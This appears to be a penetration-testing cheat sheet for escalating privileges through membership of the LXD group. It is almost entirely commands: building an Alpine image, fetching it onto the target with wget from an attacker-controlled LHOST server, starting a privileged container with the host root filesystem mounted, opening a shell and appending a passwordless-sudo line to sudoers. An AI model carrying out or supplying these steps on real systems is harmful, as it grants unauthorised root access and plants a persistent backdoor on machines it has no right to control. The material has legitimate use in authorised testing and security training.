# LXD Group

Firstly get and create lxd image, then transfer it to RHOST

```
git clone  https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
./build-alpine


python3 -m http.server 8000
wget http://LHOST:8000/apline-XXX.tar.gz
```



Second step is to import image and run container with mounted LHOST disk

```
lxc image import ./alpine-v3.10-x86_64-20191008_1227.tar.gz --alias myimage
lxc image list

lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh

```



Then you have root access to LHOST recources under /mnt/root, and you can modify sudoers file

```
cd /mnt/root/etc
echo "USERNAME ALL=(ALL) NOPASSWD: ALL" >> sudoers

```

